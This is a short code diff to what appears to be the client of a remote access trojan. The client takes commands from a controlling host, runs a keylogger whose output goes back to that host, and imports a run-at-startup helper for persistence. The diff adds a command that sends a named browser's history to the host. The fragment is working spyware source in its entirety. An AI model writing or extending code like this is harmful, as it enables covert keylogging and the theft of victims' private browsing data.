@@ -5,7 +5,7 @@ from timer import Timer
 from pathlib import Path
 from json import load
 from start_run import run_at_startup_set
-from os import getcwd
+from os import getcwd, remove
 
 
 path = Path(__file__).absolute().parent.joinpath("clientSetting.json")
@@ -52,6 +52,11 @@ while True:
                 keyboard_listener.start()
                 timer.start()
                 host.send_str(str_for_keylogger)
+
+            elif task.startswith("historial"):
+                browser = task.replace("historial", "").strip()
+                host.send_browser_historial(browser)
+                
 
             elif task == "exit":
                 host.end_connection()
